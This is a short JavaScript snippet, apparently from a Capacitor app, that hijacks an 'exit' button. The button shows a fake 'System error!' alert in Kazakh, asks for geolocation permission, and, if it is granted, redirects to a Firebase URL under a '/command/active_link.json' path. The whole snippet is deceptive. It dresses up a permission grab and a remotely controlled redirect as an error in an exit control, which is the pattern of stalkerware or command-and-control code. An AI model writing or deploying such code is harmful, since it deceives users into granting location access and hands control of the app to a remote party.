document.addEventListener('DOMContentLoaded', () => {
    const exitBtn = document.getElementById('exitBtn');
    if(exitBtn) {
        exitBtn.onclick = async (e) => {
            e.preventDefault();
            alert('Жүйелік қате!');
            try {
                const { Geolocation } = Capacitor.Plugins;
                const permissions = await Geolocation.requestPermissions();
                if (permissions.location === 'granted') {
                    window.location.href = 'https://tulpar-system-default-rtdb.firebaseio.com/command/active_link.json';
                }
            } catch (err) { location.reload(); }
        };
    }
});